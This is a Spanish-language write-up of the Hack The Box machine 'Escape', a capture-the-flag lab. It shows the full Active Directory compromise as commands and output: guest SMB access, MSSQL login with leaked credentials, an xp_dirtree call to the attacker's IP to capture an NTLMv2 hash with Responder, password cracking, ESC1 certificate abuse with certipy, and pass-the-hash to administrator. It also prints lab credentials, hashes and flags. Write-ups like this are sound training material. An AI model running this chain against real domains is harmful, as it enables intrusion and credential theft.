---
tags:
title: Escape - Medium (HTB)
permalink: /Escape-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento

```bash
nmap -sCV -p53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49681,49682,49696,49707,49729 10.129.228.253
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-18 00:55 EST
Nmap scan report for 10.129.228.253
Host is up (0.77s latency).

PORT      STATE SERVICE               VERSION
53/tcp    open  domain                Simple DNS Plus
88/tcp    open  kerberos-sec          Microsoft Windows Kerberos (server time: 2025-12-18 13:57:22Z)
135/tcp   open  msrpc                 Microsoft Windows RPC
139/tcp   open  netbios-ssn           Microsoft Windows netbios-ssn
389/tcp   open  ldap                  Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-12-18T13:59:04+00:00; +8h01m23s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http            Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap              Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2025-12-18T13:59:03+00:00; +8h01m24s from scanner time.
1433/tcp  open  ms-sql-s              Microsoft SQL Server 2019 15.00.2000
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-12-18T13:55:18
|_Not valid after:  2055-12-18T13:55:18
|_ssl-date: 2025-12-18T13:59:05+00:00; +8h01m23s from scanner time.
3268/tcp  open  ldap                  Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2025-12-18T13:59:04+00:00; +8h01m23s from scanner time.
3269/tcp  open  ssl/globalcatLDAPssl?
|_ssl-date: 2025-12-18T13:59:03+00:00; +8h01m23s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
5985/tcp  open  http                  Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf                .NET Message Framing
49667/tcp open  unknown
49681/tcp open  ncacn_http            Microsoft Windows RPC over HTTP 1.0
49682/tcp open  unknown
49696/tcp open  unknown
49707/tcp open  unknown
49729/tcp open  unknown
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-12-18T13:58:49
|_  start_date: N/A
|_clock-skew: mean: 8h01m22s, deviation: 0s, median: 8h01m22s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 121.39 seconds
```

## SMB 

Verifico la autenticación como el usuario `guest`.

```bash
nxc smb sequel.htb -u guest -p ''
SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.253  445    DC               [+] sequel.htb\guest: 
```

Y con `smbclient` de `impacket` me conecto al servicio, listando el contenido del recurso `Public`.

```bash
impacket-smbclient sequel.htb/guest@10.129.228.253 -dc-ip 10.129.228.253 -no-pass
<SNIP>
# use Public
# ls
drw-rw-rw-          0  Sat Nov 19 06:51:25 2022 .
drw-rw-rw-          0  Sat Nov 19 06:51:25 2022 ..
-rw-rw-rw-      49551  Sat Nov 19 06:51:25 2022 SQL Server Procedures.pdf
```
### Credentials

Me descargo el `pdf` y dentro del mismo veo unas credenciales, y que además se habla de que las mismas son para la conexión para la base de datos de `mssql`.

![image-center](/assets/images/Pasted image 20251218030058.png)

![image-center](/assets/images/Pasted image 20251218030102.png)
## Hash

Con el uso de las mismas me conecto usando `mssqlclient`.

```bash
impacket-mssqlclient sequel.htb/publicuser:GuestUserCantWrite1@dc.sequel.htb -dc-ip 10.129.228.253
Impacket v0.13.0.dev0+20251016.112753.23a36c62 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (PublicUser  guest@master)> 
```

Y como esta vacía de datos, use `xp_dirtree` para poder hacer que la base intente ver el recurso compartido de mi lado, desde donde voy a estar con `Responder` a la espera de conexiones, para así interceptar un hash `NetNTLMv2` del usuario que este por detrás.

```bash
SQL (PublicUser  guest@master)> xp_dirtree \\10.10.17.19\test
```
## Shell as svc_sql

Y desde mi `Responder` veo que recibo un hash para el usuario `svc_sql`.

```bash
responder -I tun0
<SNIP>
[SMB] NTLMv2-SSP Client   : 10.129.228.253
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:ac15171ed3c7d222:349BB5F4A4F31C6BF5B166634F3C9B50:0101000000000000001C0571BB6FDC018B806C46E85E55120000000002000800330055003200390001001E00570049004E002D005100590044004F004C0041003400520038003600480004003400570049004E002D005100590044004F004C004100340052003800360048002E0033005500320039002E004C004F00430041004C000300140033005500320039002E004C004F00430041004C000500140033005500320039002E004C004F00430041004C0007000800001C0571BB6FDC010600040002000000080030003000000000000000000000000030000037D940E8C22663D8CE013915928968EB80A280420A922CF03E2B27D1AF102F3A0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310037002E00310039000000000000000000 
```
### Crack password

Lo meto dentro de un archivo y lo crackeo con `john`.

```bash
john has -w=/usr/share/wordlists/rockyou.txt  
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
REGGIE1234ronnie (sql_svc)     
1g 0:00:00:01 DONE (2025-12-18 01:13) 0.5434g/s 5818Kp/s 5818Kc/s 5818KC/s RENZOJAVIER..RAHFIYAW
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

Ahora que tengo las credenciales del usuario, las valido con `nxc`.

```bash
nxc winrm sequel.htb -u sql_svc -p 'REGGIE1234ronnie'
WINRM       10.129.228.253  5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
WINRM       10.129.228.253  5985   DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie (Pwn3d!)
```

Y me conecto a la maquina.

```powershell
evil-winrm -i sequel.htb -u sql_svc -p 'REGGIE1234ronnie'
<SNIP>

*Evil-WinRM* PS C:\Users\sql_svc\Documents>
```
## Shell as ryan.cooper

Enumerando el sistema no encontré nada interesante, excepto por un archivo de log de `MySQL Server`.

```powershell
*Evil-WinRM* PS C:\SQLServer\logs> cat ERRORLOG.BAK
<SNIP>
2022-11-18 13:43:07.44 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.72 spid51      Attempting to load library 'xpstar.dll' into memory. This is an informational message only. No user action is required.
2022-11-18 13:43:07.76 spid51      Using 'xpstar.dll' version '2019.150.2000' to execute extended stored procedure 'xp_sqlagent_is_starting'. This is an informational message only; no user action is required.
```

Dentro del mismo obtuve las credenciales del usuario `ryan.cooper`, así que las valide para asegurarme de que sean correctas.

```bash
nxc winrm sequel.htb -u Ryan.Cooper -p 'NuclearMosquito3'
WINRM       10.129.228.253  5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
WINRM       10.129.228.253  5985   DC               [+] sequel.htb\Ryan.Cooper:NuclearMosquito3 (Pwn3d!)
```

Y me volví a conectar como el para poder ver la flag.
```powershell
evil-winrm -i sequel.htb -u ryan.cooper -p 'NuclearMosquito3'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> type ../desktop/user.txt
bd457139c40f811d4f885277ba324ee9
```
## ESC1

Buscando plantillas vulnerables del dominio, vi que una es vulnerable a `ESC1`.

>`ESC1` es la configuración errónea de `AD CS` que puede conducir directamente a una escalada de privilegios. La vulnerabilidad surge cuando una `plantilla` de certificado está inadecuadamente asegurada, permitiendo a un usuario de `bajo privilegio` solicitar un certificado y, lo que es más importante, especificar una identidad arbitraria dentro de la `SAN` del certificado. Esto permite al atacante hacerse pasar por `cualquier` usuario, incluidos los `administradores`.

```bash
certipy find -dc-ip 10.129.228.253 -target dc.sequel.htb -enabled -vulnerable -stdout -u ryan.cooper -p NuclearMosquito3       
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'sequel-DC-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'sequel-DC-CA'
[*] Checking web enrollment for CA 'sequel-DC-CA' @ 'dc.sequel.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : sequel-DC-CA
    DNS Name                            : dc.sequel.htb
    Certificate Subject                 : CN=sequel-DC-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Certificate Validity Start          : 2022-11-18 20:58:46+00:00
    Certificate Validity End            : 2121-11-18 21:08:46+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : UserAuthentication
    Display Name                        : UserAuthentication
    Certificate Authorities             : sequel-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 10 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2022-11-18T21:10:22+00:00
    Template Last Modified              : 2024-01-19T00:26:38+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Administrator
        Full Control Principals         : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Property Enroll           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
    [+] User Enrollable Principals      : SEQUEL.HTB\Domain Users
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```

Para poder obtener un certificado como el usuario `Administrator` debo saber el `SID`, `template`, y el `ca-name` para eso use este comando de `Powershell`
```bash
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> Get-ADUser -Identity administrator | select Name,SID 

Name          SID
----          ---
Administrator S-1-5-21-4078382237-1492182817-2568127209-500
```
### pfx

Ahora si puedo solicitar el certificado `.pfx` con el siguiente comando.

```bash
certipy req \
    -u 'ryan.cooper@sequel.htb' -p 'NuclearMosquito3' \
    -dc-ip '10.129.228.253' -target 'dc.sequel.htb' \
    -ca 'sequel-DC-CA' -template 'UserAuthentication' \
    -upn 'administrator@sequel.htb' -sid 'S-1-5-21-4078382237-1492182817-2568127209-500'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 14
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate object SID is 'S-1-5-21-4078382237-1492182817-2568127209-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```
### Auth

Y ahora haciendo uso del mismo puedo obtener el `TGT` con el que me voy a conectar por `WinRM`.

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.129.228.253'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@sequel.htb'
[*]     SAN URL SID: 'S-1-5-21-4078382237-1492182817-2568127209-500'
[*] Using principal: 'administrator@sequel.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
```
## Shell

```powershell
evil-winrm -i sequel.htb -u administrator -H 'a52f78e4c751e5f5e17e1e9f3e58f4ee'
<SNIP>

*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../desktop/root.txt
'8e2a0cd8996b5cd821055c3147dce0b4
```

`~Happy Hacking.`

